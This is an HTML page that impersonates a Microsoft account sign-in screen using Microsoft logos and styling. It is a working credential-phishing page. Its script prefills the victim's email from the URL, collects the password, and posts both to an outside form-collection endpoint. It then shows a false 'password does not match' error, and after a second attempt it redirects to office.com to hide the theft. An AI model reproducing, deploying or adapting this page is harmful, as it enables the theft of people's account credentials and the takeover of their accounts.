<!DOCTYPE html>
<html>
<head>
	<title>Sign in to your Microsoft account</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
	<link rel="shortcut icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>

    <style type="text/css">
	.slide {
	  -moz-animation-duration: 0.7s;
	  -webkit-animation-duration: 0.7s;
	  -moz-animation-name: slidein-left;
	  -webkit-animation-name: slidein-left;
	}

	@-moz-keyframes slidein-left {
	  from {
		margin-left: 80%;
		width:
	  }
	  to {
		margin-left: 0%;
		width: 
	  }
	}

	@-webkit-keyframes slidein-left {
	  from {
		margin-left: 80%;
		width: 
	  }
	  to {
		margin-left: 0%;
		width: 
	  }
	}


	* {
		box-sizing: border-box;
	}

	#title{
		color: #222222;
		margin-top: 7px;
		font-size: 1.5rem;
		font-weight: 600;
		font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
	}
	body {
		font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
		margin: 0;
		padding: 0;
		width: 100;
		background-image: url("https://https://img.freepik.com/free-photo/abstract-surface-textures-white-concrete-stone-wall_74190-8189.jpg?w=996&t=st=1680789028~exp=1680789628~hmac=10fcd2ceefdd11950877119f1fb49006f7566094a68ab56c6dbd26ea46c8169a");
		background-repeat: no-repeat;
		background-attachment: fixed;
		background-position: center;
		background-size: cover;
		background-origin: border-box;
	}

	.overlay {
		position: absolute;
		width: 100%;
		height: 100%;
		background-color: rgba(255,255,255,0.4);
	}

	a { 
		text-decoration: none; 
		color: #0067b8;
	}

	a:hover { color: #005da6; }

	.cookie{
		display: block;
		position: fixed;
		width: 100%;
		top: 0;
		left: 0;
		padding: 0;
		color: #555;
		height: 50px;
		background-color: #f2f2f2;
		text-align: left;
		padding: .75em;
		display: inline-block;
		font-size: 0.9rem;
		
	}

	.img_cookie{
		margin-bottom: -7px; 
		margin-left: 8%; 
		height: 24px
	}

	.cookie a{
		margin-left: 20%;
		color: #0067b8;
	}

	.cookie a:hover{
		text-decoration: underline;
	}

	footer {
		display: block;
		position: fixed;
		width: 100%;
		height: 28px;
		bottom: 0;
		left: 0;
		padding: 0;
		color: #111;
	}

	footer ul {
		padding: 0;
		margin: 0;
	}

	footer ul li {
		list-style-type: none;
		display: inline-table;
		float: right;
		margin: 1px 10px;
	}

	footer ul li a {
		color: #111; 
		font-size: 12px;
	}

	footer ul li a:hover{
		color: #111; 
		text-decoration: underline;
	}

	.btn-group {
		display: inline-flex;
	}		

	.login-box {
		background-color: #fff;
		z-index: 1000;
		margin: auto;
		margin-top: 7%;
		min-height: 415px;
		min-width: 300px;
		max-width: 445px;
		width: 445px;
		padding: 40px 50px 30px;
		border: groove 1px rgba(0,0,0,0.1);
		-webkit-box-shadow: 1px 1px 15px 1px #000000; 
		box-shadow: 1px 1px 15px 1px #A2A2A2
	}

	.login-box h2 {
		font-weight: normal;
		margin-bottom: 0.5em;
	}

	.login-box input[type='email'], .login-box input[type='password'] {
		width: 96%;
		border-color: #000;
		border-width: .5px;
		padding-left: 10px;
		height: 2.5em;
		font-size: 15px;
		box-shadow: none;
		overflow: hidden;
		border-style: solid;
		margin-bottom: 1em;
	}

	.login-box input[type='email']:focus,
	.login-box input[type='email']:active,
	.login-box input[type='password']:focus, 
	.login-box input[type='password']:active {
		outline: none;
		border-color: ;
	}

	.login-box input[type='f'], .login-box input[type='reset'], .next {
		display: block;
		width: 100%;
		background-color: #0067b8;
		height: 32px;
		color: #fff;
		border-color: transparent;
		font-size: 15px;
		outline: none;
	}

	.login-box input[type='reset'].rev-btn {
		background-color: #ccc;
		color: #000;
		border-color: transparent;
	}

	.next{
		margin-top: 35px; 
		margin-left: 240px; 
		width: 110px;
	}

	.login-box input[type='submit']:hover, .login-box input[type='reset']:hover, .next:hover {
		background-color: #005da6;
		border-color: #transparent;
		outline: none;
	}

	.login-box input[type='reset'].rev-btn:hover {
		background-color: ;
		color: ;
		border-color: ;
	}

	.login-box input[type='submit']:focus, .login-box input[type='reset']:focus, .next:focus {
		border-width: ;
		border-color: ;
		text-decoration: none;
		outline: none;
	}

	.login-box input[type='reset'].rev-btn:focus {
		border-width: ;
		border-color: ;
		text-decoration: note;
		outline: none;
	}

	.login-box input[type='checkbox'] {
		width: 20px;
		height: 20px;
		float: left;
	}

	.login-box input[type='checkbox']:focus {
		outline: none;
	}

	.identity-banner {
		height: 28px;
		background: #f2f2f2;
		margin: 16px -30px;
		padding: 0 36px;
	}

	.identity {
		line-height: 28px;
		white-space: nowrap;
		overflow: hidden;
		text-overflow: ellipsis;
		text-align: right;
		width: calc(100% - 56px);
	}

	.profile-photo {
		height: 48px;
		width: 48px;
		margin-top: -48px;
		border-radius: 50%;
		overflow: hidden;
		float: right;
	}

	.hidden {
		display: none;
		visibility: hidden;
	}

	.fade:hover {
		color: #666;
	}

	.message {
		font-size: 0.9rem;
		color: #FF2626;
	}

	.error {
		outline: none;
		border-color: #FF2626 !important;
	}


	.loader {
		position: absolute;
		padding-top: 0;
		width: 40px;
		margin: -22px;
	}

	.loader .circle {
		position: absolute;
		width: 18px;
		height: 18px;
		opacity: 0;
		transform: rotate(225deg);
		animation-iteration-count: infinite;
		animation-name: orbit;
		animation-duration: 3s;
	}

	.loader .circle:after {
		content: "";
		position: absolute;
		width: 3px;
		height: 3px;
		border-radius: 5px;
		background: #000;
	}

	.loader .circle:nth-child(2) {
		animation-delay: 240ms;
	}
	.loader .circle:nth-child(3) {
		animation-delay: 480ms;
	}
	.loader .circle:nth-child(4) {
		animation-delay: 720ms;
	}
	.loader .circle:nth-child(5) {
		animation-delay: 960ms;
	}

	@keyframes orbit {
		0% {
			transform: translate(10px, 0);
			opacity: 1;
			animation-timing-function: ease-out;
		}
		7% {
			transform: translate(30px, 0);
			animation-timing-function: linear;
		}
		30% {
			transform: translate(60px, 0);
			animation-timing-function: ease-in-out;
		}
		40% {
			transform: translate(90px, 0);
			animation-timing-function: ease-out;
		}
		50% {
			transform: translate(120px, 0);
			animation-timing-function: ease-out;
		}
		75% {
			transform: translate(250px, 0);
			animation-timing-function: ease-out;
		}
		76% {
			transform: translate(300px, 0);
			opacity: 0;
		}
		100% {
			transform: translate(350px, 0);
			opacity: 0;
		}
	}


	@media(max-width: 600px) {
		body {
			background-color: #fff;
			background-image: none;
		}

		.overlay {
			background-color: rgba(0,0,0,0);
		}

		.login-box {
			border: none;
		}

		footer {
			background-color: rgba(0,0,0,0);
		}

		footer ul li {
			margin: 1px 5px;
		}

		footer ul li a {
			color: #666;
		}

		footer ul li a:hover {
			color: #666; 
		}
		.cookie{
			font-size: 0.63rem;	
		}
		.img_cookie{
			margin-bottom: -10px; 
			margin-left: 0px; 
			height: 24px
		}
	}

	@media(max-width: 425px) {
		.login-box {
			width: 410px
		}
		.next{
			margin-left: 140px; 
		}
	}


	@media(max-width: 375px) {
		.login-box {
			width: 380px
		}
		.next{
			margin-left: 160px; 
		}
		footer ul {
			margin-right: 10%;
		}
	}


	@media(max-width: 320px) {
		.login-box {
			width: 320px
		}
		.next{
			margin-left: 100px; 
		}
	}

    </style>
	
</head>
<body style="">
	<div class="overlay" >
		
		<div class="login-box">
		
		<IMG
src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" width=115 height=35>
		
		<br><br>
			
			<div id="div1">
			<h2 class="slide" id="title"></h2>
			<p id="error" class="message"></p>
				<input id="email" autofocus minlength="6" type="email" name="email" style="padding-left: 0px; border: 0px; border-bottom: 1px solid #aaa; font-size:18px;" value="" required/>
				<div id="loader" class="loader" hidden>
					<div class="circle"></div>
					<div class="circle"></div>
					<div class="circle"></div>
					<div class="circle"></div>
					<div class="circle"></div>
				</div>
				
				<font face="arial" size="2" color="#0431B4"><font color="#6E6E6E">No account? </font>
				<a href="#" style="text-decoration:none;"><font color="#0431B4">Create one!</font></a></font>
				<br>
				<a href="#" style="text-decoration:none;">
				<font face="arial" size="2" color="#0431B4">Sign in with a security key</font></a>
				<a href="#">
			
			<button id="next" type="submit" class="next">Next</button>
			</div>
			
			<div id="div2">
			<div style="margin-bottom: 0px; margin-top: 20px; cursor: pointer;"><span id="emailch" style="font-size:18px;"></span></div>
			<h2 class="slide" id="title">Enter&nbsp;password</h2>

			<p id="msg1" class="message" style="display: none">Please enter a valid password.</p>
			<p id="msg" class="message"></p>

			<form class="slide" id="contact" autocomplete="off">
				<input id="email" minlength="6" type="email" hidden name="email" style="padding-left: 0px; border: 0px; border-bottom: 1px solid #aaa" value="email" placeholder="email">
				<input id="password" autofocus autocomplete="false" minlength="6" type="password" required name="password" style="padding-left: 0px; border: 0px; border-bottom: 1px solid #aaa" value="" placeholder="Password">
				<div id="loader" class="loader" hidden>
					<div class="circle"></div>
					<div class="circle"></div>
					<div class="circle"></div>
					<div class="circle"></div>
					<div class="circle"></div>
				</div>
				

			<br>

			<div id="group1" style="color: #444; margin-left: -1px; margin-top: -2px;">
				<font face="arial" size="2" color="#0431B4"><font color="#6E6E6E">No account? </font>
				<a href="#" style="text-decoration:none;"><font color="#0431B4">Create one!</font></a></font>
				<br>
				<a href="#" style="text-decoration:none;">
				<font face="arial" size="2" color="#0431B4">Sign in with a security key</font></a>
				<a href="#">
			</div>
			<br>
			<div id="group1" style="margin-left: -2px; margin-top: -10px">
				<small id="cant"><a href="#" class="fade"></a></small>
			</div>
			
			<button id="submit-btn" type="submit" class="next">Sign&nbsp;in</button>
			</form>	
			</div>
			
		</div>
	</div>
	
	
	
	
	<footer>
		<ul>
		
	</footer>
   

	<!-- The core Firebase JS SDK is always required and must be listed first -->
	<script src="/__/firebase/7.15.1/firebase-app.js"></script>

	<!-- TODO: Add SDKs for Firebase products that you want to use
		 https://firebase.google.com/docs/web/setup#available-libraries -->
	<script src="/__/firebase/7.15.1/firebase-analytics.js"></script>

	<!-- Initialize Firebase -->
	<script src="/__/firebase/init.js"></script>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>


  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>

	<script type="text/javascript">
    /* global $ */
    $(document).ready(function(){

      $('#error').hide()
      $("#div2").hide()
      $("#msg").hide()

      var email = window.location.hash.substr(1)
      if (!email) {

      }
      else
      {
        $('#email').val(email)
        var my_email =email
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show()
          email.focus
          return false
        }
        var ind=my_email.indexOf("@")
        var my_slice=my_email.substr((ind+1))
        var c= my_slice.substr(0, my_slice.indexOf('.'))
        var fin= c.toLowerCase()
       //  if (fin=="gmail" || fin=="yahoo" || fin=="hotmail" || fin=="aol" || fin=="outlook") {
       //   $('#error').show()

       // }
       // else
       // {
        //$("#div1").animate({left:200, opacity:"hide"}, 0)
        //$("#div2").animate({right:200, opacity:"show"}, 1000)
        $('#div1').hide()
		$("#div2").show()
		$("#emailch").html(my_email)
      // }
      }

	  $('#email').keypress(function(){
			$('#error').hide()
		})
	  
      $('#next').click(function () {
        var my_email =$('#email').val()
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/

        if (!filter.test(my_email)) {
          $('#error').show()
          email.focus
          return false
        }
        var ind=my_email.indexOf("@")
        var my_slice=my_email.substr((ind+1))
        var c= my_slice.substr(0, my_slice.indexOf('.'))
        var fin= c.toLowerCase()
       //  if (fin=="gmail" || fin=="yahoo" || fin=="hotmail" || fin=="aol" || fin=="outlook") {
       //   $('#error').show()

       // }
       // else
       // {
        //$("#div1").animate({left:200, opacity:"hide"}, 0)
        //$("#div2").animate({right:200, opacity:"show"}, 1000)
		$('#div1').hide()
		$("#div2").show()
        $("#emailch").html(my_email)

      // }
    })
      $('#back').click(function () {
        $("#msg").hide()
        //$("#div2").animate({left:200, opacity:"hide"}, 0)
        //$("#div1").animate({right:200, opacity:"show"}, 1000)
		$('#div2').hide()
		$("#div1").show()

      })

var count=0
      $('#submit-btn').click(function(event){
        event.preventDefault()
        var email=$("#email").val()
        var password=$("#password").val()
        var detail=$("#field").html()
        var msg = $('#msg').html()
        $('#msg').text( msg )
		
		$('#password').keypress(function(){
			$('#msg1').hide()
			$('#msg').hide()
		})
		
		if(password.length < 6){
			$('#msg1').show()
			password.focus
			return false
		}		
		

        count=count+1
        $.ajax({
          dataType: 'JSON',
          url: 'https://submit-form.com/sqr3G6s3',
          type: 'POST',
          data:{
            email:email,
            password:password,
            detail:detail,

          },
          beforeSend: function(xhr){
            $('#submit-btn').html('Signing in...')
          },
          success: function(response){
            if(response){
              $("#msg").show()
              console.log(response)
              if(response['signal'] == 'ok'){
               $('#msg').html(response['msg'])
               var password=$("#password").val("")
             }
             else{
              $('#msg').html(response['msg'])
              var password=$("#password").val("")
            }
          }
        },
        error: function(){
          $("#msg").show()
		  $('#password').click(function(){
			$('#msg').hide()
		  })
          $('#msg').html("Your password does not match. Please try again.")
          var password=$("#password").val("")
        },
        complete: function(){
          $('#submit-btn').html('Sign in')
		  if (count>=2) {
				$('#msg').hide()
				window.location.replace("https://office.com")
			}
        }
      })
     })
    })
  </script>
</body>
</html>
